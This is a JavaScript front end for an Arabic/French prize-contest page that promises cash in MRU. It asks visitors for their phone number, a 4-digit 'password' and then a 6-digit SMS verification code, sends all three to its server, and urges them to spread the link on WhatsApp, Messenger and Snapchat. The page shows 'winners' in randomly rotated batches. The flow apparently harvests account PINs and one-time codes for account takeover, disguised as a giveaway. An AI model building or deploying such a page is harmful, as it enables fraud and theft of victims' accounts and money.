(function () {
  "use strict";

  var LANG = "ar";
  var API_BASE = (typeof window.API_BASE === "string" ? window.API_BASE : "").replace(/\/$/, "");
  var COMPANY = typeof window.COMPANY_NAME === "string" && window.COMPANY_NAME.trim()
    ? window.COMPANY_NAME.trim()
    : null;

  var state = {
    participantId: null,
    phone: "",
    entryCode: "",
    verified: false,
    winners: [],
    batches: [[]],
    currentBatch: 0,
    winnersTimer: null,
  };

  var I18N = {
    ar: {
      landing: {
        title: "مسابقة {{company}} الكبرى",
        subtitle: "فرصتك للفوز بجوائز قيمة",
        cta: "تسجيل الدخول / المشاركة",
        winners_title: "🏅 الفائزون",
        prizes_title: "الجوائز",
        prize_cash_1: "10,000 MRU نقداً",
        prize_cash_2: "5,000 MRU نقداً",
        prize_goods: "هدايا عينية قيّمة",
      },
      registration: {
        heading: "التسجيل",
        phone_label: "رقم الهاتف",
        phone_placeholder: "أدخل رقم هاتفك (8 أرقام)",
        password_label: "كلمة السر",
        password_placeholder: "أدخل كلمة سر مكونة من 4 أرقام",
        submit: "التسجيل",
      },
      otp: {
        title: "إدخال رمز التحقق",
        hint: "أدخل رمز التحقق المكون من 6 أرقام",
        sms_hint: "تحقق من رسالتك للحصول على الرمز",
        verify: "تحقق",
      },
      errors: {
        title: "خطأ",
        invalid_registration: "معلومات التسجيل غير صحيحة",
        invalid_otp: "رمز التحقق غير صحيح",
        retry: "حاول مرة أخرى",
        retry_otp: "إعادة المحاولة",
      },
      share: {
        whatsapp_text: "🎉 انضم لمسابقة {{company}} واربح جوائز قيمة!\n{{link}}",
        success: "تم التسجيل بنجاح!",
        subtitle: "شارك المسابقة مع أصدقائك لزيادة فرصك",
        message:
          "شارك رابط المسابقة لزيادة فرصك في الفوز. كل مشاركة صحيحة تزيد من فرصتك للفوز بالجوائز القيمة!",
        whatsapp: "واتساب",
        messenger: "ماسنجر",
        snapchat: "سناب شات",
      },
    },
    fr: {
      landing: {
        title: "Grand Concours {{company}}",
        subtitle: "Votre chance de gagner des prix précieux",
        cta: "S'inscrire / Participer",
        winners_title: "🏅 Les Gagnants",
        prizes_title: "Les prix",
        prize_cash_1: "10 000 MRU en espèces",
        prize_cash_2: "5 000 MRU en espèces",
        prize_goods: "Cadeaux en nature",
      },
      registration: {
        heading: "S'inscrire",
        phone_label: "Numéro de téléphone",
        phone_placeholder: "Entrez votre numéro (8 chiffres)",
        password_label: "Mot de passe",
        password_placeholder: "Entrez un mot de passe à 4 chiffres",
        submit: "S'inscrire",
      },
      otp: {
        title: "Code de vérification",
        hint: "Entrez le code à 6 chiffres",
        sms_hint: "Vérifiez votre message pour le code",
        verify: "Vérifier",
      },
      errors: {
        title: "Erreur",
        invalid_registration: "Informations d'inscription incorrectes",
        invalid_otp: "Code de vérification incorrect",
        retry: "Réessayer",
        retry_otp: "Réessayer",
      },
      share: {
        whatsapp_text: "🎉 Rejoignez le grand concours {{company}} et gagnez des prix !\n{{link}}",
        success: "Inscription réussie !",
        subtitle: "Partagez le concours avec vos amis pour augmenter vos chances",
        message:
          "Partagez le lien du concours pour augmenter vos chances de gagner. Chaque partage valide augmente vos chances de remporter des prix !",
        whatsapp: "WhatsApp",
        messenger: "Messenger",
        snapchat: "Snapchat",
      },
    },
  };

  function defaultCompany() {
    return LANG === "ar" ? "الشركة" : "Nom de l'entreprise";
  }

  function companyName() {
    return COMPANY || defaultCompany();
  }

  function deepGet(obj, path) {
    return path.split(".").reduce(function (o, k) {
      return o && o[k] !== undefined ? o[k] : undefined;
    }, obj);
  }

  function t(path, extra) {
    var s = deepGet(I18N[LANG], path);
    if (typeof s !== "string") return path;
    s = s.replace(/\{\{company\}\}/g, (extra && extra.company) || companyName());
    s = s.replace(/\{\{link\}\}/g, (extra && extra.link) || window.location.origin);
    return s;
  }

  function apiUrl(p) {
    if (!p.startsWith("/")) p = "/" + p;
    return API_BASE ? API_BASE + p : p;
  }

  function apiJson(path, options) {
    options = options || {};
    var headers = Object.assign({ "Content-Type": "application/json" }, options.headers || {});
    return fetch(apiUrl(path), {
      method: options.method || "GET",
      headers: headers,
      body: options.body,
      credentials: "include",
    }).then(function (res) {
      return res.json().then(function (data) {
        if (!res.ok) {
          var err = new Error(data.message || res.statusText);
          err.data = data;
          err.status = res.status;
          throw err;
        }
        return data;
      });
    });
  }

  function $(id) {
    return document.getElementById(id);
  }

  function showView(name) {
    ["view-landing", "view-register", "view-otp", "view-share"].forEach(function (id) {
      var el = $(id);
      if (!el) return;
      el.classList.toggle("hidden", id !== "view-" + name);
    });
  }

  function setDirLang() {
    document.documentElement.lang = LANG;
    document.documentElement.dir = LANG === "ar" ? "rtl" : "ltr";
  }

  function applyTexts() {
    setDirLang();
    $("btn-lang").textContent = LANG === "ar" ? "🇫🇷 Français" : "🇦🇪 العربية";
    $("header-title").textContent = t("landing.title");
    $("btn-header-cta").textContent = t("landing.cta");
    $("landing-title").textContent = t("landing.title");
    $("landing-subtitle").textContent = t("landing.subtitle");
    $("btn-landing-cta").textContent = t("landing.cta");
    $("prizes-heading").textContent = t("landing.prizes_title");
    $("prize-1").textContent = t("landing.prize_cash_1");
    $("prize-2").textContent = t("landing.prize_cash_2");
    $("prize-3").textContent = t("landing.prize_goods");
    $("winners-heading").textContent = t("landing.winners_title");
    $("register-heading").textContent = t("registration.heading");
    $("lbl-phone").textContent = t("registration.phone_label");
    $("input-phone").placeholder = t("registration.phone_placeholder");
    $("lbl-entry").textContent = t("registration.password_label");
    $("input-entry").placeholder = t("registration.password_placeholder");
    $("btn-register").textContent = t("registration.submit");
    $("otp-heading").textContent = t("otp.title");
    $("otp-hint").textContent = t("otp.hint");
    $("otp-sms").textContent = t("otp.sms_hint");
    $("btn-otp").textContent = t("otp.verify");
    $("share-success").textContent = t("share.success");
    $("share-sub").textContent = t("share.subtitle");
    $("share-msg").textContent = t("share.message");
    $("share-wa").textContent = t("share.whatsapp");
    $("share-fb").textContent = t("share.messenger");
    $("share-sc").textContent = t("share.snapchat");
  }

  function buildBatches(winners) {
    var batches = [];
    var i = 0;
    while (i < winners.length) {
      var size = Math.floor(Math.random() * 6) + 5;
      batches.push(winners.slice(i, i + size));
      i += size;
    }
    return batches.length ? batches : [[]];
  }

  function renderWinnersSlice() {
    var grid = $("winners-grid");
    if (!grid) return;
    var slice = state.batches[state.currentBatch] || [];
    grid.innerHTML = "";
    slice.forEach(function (w) {
      var card = document.createElement("div");
      card.className = "winner-card";
      card.innerHTML =
        "<p class=\"winner-card__name\"></p><p class=\"winner-card__phone\" dir=\"ltr\"></p><p class=\"winner-card__prize\"></p>";
      card.querySelector(".winner-card__name").textContent = w.name;
      card.querySelector(".winner-card__phone").textContent = w.phone_masked;
      card.querySelector(".winner-card__prize").textContent = w.prize_amount;
      grid.appendChild(card);
    });
  }

  function startWinnersRotation() {
    if (state.winnersTimer) clearInterval(state.winnersTimer);
    var total = state.batches.length;
    if (total <= 1) return;
    var grid = $("winners-grid");
    state.winnersTimer = setInterval(function () {
      grid.classList.add("is-dim");
      setTimeout(function () {
        state.currentBatch += 1;
        if (state.currentBatch >= total) state.currentBatch = 0;
        renderWinnersSlice();
        grid.classList.remove("is-dim");
      }, 280);
    }, 5000);
  }

  function loadWinners() {
    return apiJson("/api/winners")
      .then(function (data) {
        if (data.success && data.winners) {
          state.winners = data.winners;
          state.batches = buildBatches(state.winners);
          state.currentBatch = 0;
          renderWinnersSlice();
          startWinnersRotation();
        }
      })
      .catch(function () {
        state.winners = [];
        state.batches = [[]];
        renderWinnersSlice();
      });
  }

  function openModal(title, message, actionLabel, onAction) {
    $("modal-title").textContent = title;
    $("modal-message").textContent = message;
    var btn = $("modal-action");
    btn.textContent = actionLabel;
    btn.onclick = function () {
      closeModal();
      if (onAction) onAction();
    };
    $("modal").classList.remove("hidden");
  }

  function closeModal() {
    $("modal").classList.add("hidden");
  }

  function goRegister() {
    if (state.winnersTimer) {
      clearInterval(state.winnersTimer);
      state.winnersTimer = null;
    }
    showView("register");
  }

  function goLanding() {
    showView("landing");
    loadWinners();
  }

  function goOtp() {
    if (!state.participantId || !state.phone || !state.entryCode) {
      goRegister();
      return;
    }
    showView("otp");
    buildOtpInputs();
    updateOtpButton();
  }

  function goShare() {
    if (!state.participantId || !state.verified) {
      goLanding();
      return;
    }
    showView("share");
  }

  function buildOtpInputs() {
    var row = $("otp-boxes");
    row.innerHTML = "";
    for (var i = 0; i < 6; i++) {
      var inp = document.createElement("input");
      inp.type = "tel";
      inp.inputMode = "numeric";
      inp.maxLength = 1;
      inp.className = "otp-cell";
      inp.dataset.index = String(i);
      inp.addEventListener("input", onOtpInput);
      inp.addEventListener("keydown", onOtpKeydown);
      row.appendChild(inp);
    }
    row.querySelector(".otp-cell").focus();
  }

  function otpInputs() {
    return Array.prototype.slice.call(document.querySelectorAll(".otp-cell"));
  }

  function onOtpInput(e) {
    var idx = parseInt(e.target.dataset.index, 10);
    var v = e.target.value.replace(/\D/g, "").slice(-1);
    e.target.value = v;
    if (v && idx < 5) otpInputs()[idx + 1].focus();
    updateOtpButton();
  }

  function onOtpKeydown(e) {
    var idx = parseInt(e.target.dataset.index, 10);
    if (e.key === "Backspace" && !e.target.value && idx > 0) {
      otpInputs()[idx - 1].focus();
    }
  }

  function getOtpCode() {
    return otpInputs()
      .map(function (el) {
        return el.value.replace(/\D/g, "");
      })
      .join("");
  }

  function updateOtpButton() {
    $("btn-otp").disabled = getOtpCode().length !== 6;
  }

  function resetSession() {
    state.participantId = null;
    state.phone = "";
    state.entryCode = "";
    state.verified = false;
  }

  function abandonOtp() {
    if (!state.participantId) return Promise.resolve();
    return apiJson("/api/abandon-otp", {
      method: "POST",
      body: JSON.stringify({ participantId: state.participantId }),
    }).catch(function () {});
  }

  function trackShare(platform) {
    if (!state.participantId) return Promise.resolve();
    return apiJson("/api/track-share", {
      method: "POST",
      body: JSON.stringify({ participantId: state.participantId, platform: platform }),
    }).catch(function () {});
  }

  function init() {
    applyTexts();
    loadWinners();

    $("nav-home").addEventListener("click", function (e) {
      e.preventDefault();
      goLanding();
    });
    $("btn-lang").addEventListener("click", function () {
      LANG = LANG === "ar" ? "fr" : "ar";
      applyTexts();
      renderWinnersSlice();
    });
    $("btn-header-cta").addEventListener("click", goRegister);
    $("btn-landing-cta").addEventListener("click", goRegister);

    $("form-register").addEventListener("submit", function (e) {
      e.preventDefault();
      var phone = ($("input-phone").value || "").replace(/\D/g, "").slice(0, 8);
      var entryCode = ($("input-entry").value || "").replace(/\D/g, "").slice(0, 4);
      $("input-phone").value = phone;
      $("input-entry").value = entryCode;
      $("btn-register").disabled = true;
      apiJson("/api/register", {
        method: "POST",
        body: JSON.stringify({ phone: phone, entryCode: entryCode }),
      })
        .then(function (data) {
          if (data.success && data.participantId) {
            state.participantId = data.participantId;
            state.phone = phone;
            state.entryCode = entryCode;
            goOtp();
          }
        })
        .catch(function () {
          openModal(t("errors.title"), t("errors.invalid_registration"), t("errors.retry"), function () {});
        })
        .finally(function () {
          $("btn-register").disabled = false;
        });
    });

    $("input-phone").addEventListener("input", function () {
      $("input-phone").value = $("input-phone").value.replace(/\D/g, "").slice(0, 8);
    });
    $("input-entry").addEventListener("input", function () {
      $("input-entry").value = $("input-entry").value.replace(/\D/g, "").slice(0, 4);
    });

    $("form-otp").addEventListener("submit", function (e) {
      e.preventDefault();
      var otpCode = getOtpCode();
      if (otpCode.length !== 6) return;
      $("btn-otp").disabled = true;
      apiJson("/api/verify-otp", {
        method: "POST",
        body: JSON.stringify({
          participantId: state.participantId,
          phone: state.phone,
          entryCode: state.entryCode,
          otpCode: otpCode,
        }),
      })
        .then(function () {
          state.verified = true;
          goShare();
        })
        .catch(function () {
          openModal(t("errors.title"), t("errors.invalid_otp"), t("errors.retry_otp"), function () {
            abandonOtp().then(function () {
              resetSession();
              $("input-phone").value = "";
              $("input-entry").value = "";
              goRegister();
            });
          });
        })
        .finally(function () {
          $("btn-otp").disabled = getOtpCode().length !== 6;
        });
    });

    var origin = window.location.origin;
    $("share-wa").addEventListener("click", function () {
      var text = t("share.whatsapp_text", { company: companyName(), link: origin });
      var url = "https://wa.me/?text=" + encodeURIComponent(text);
      trackShare("whatsapp").then(function () {
        window.open(url, "_blank", "noopener,noreferrer");
      });
    });
    $("share-fb").addEventListener("click", function () {
      var url = "fb-messenger://share?link=" + encodeURIComponent(origin);
      trackShare("messenger").then(function () {
        window.open(url, "_blank", "noopener,noreferrer");
      });
    });
    $("share-sc").addEventListener("click", function () {
      var url = "https://www.snapchat.com/scan?attachmentUrl=" + encodeURIComponent(origin);
      trackShare("snapchat").then(function () {
        window.open(url, "_blank", "noopener,noreferrer");
      });
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
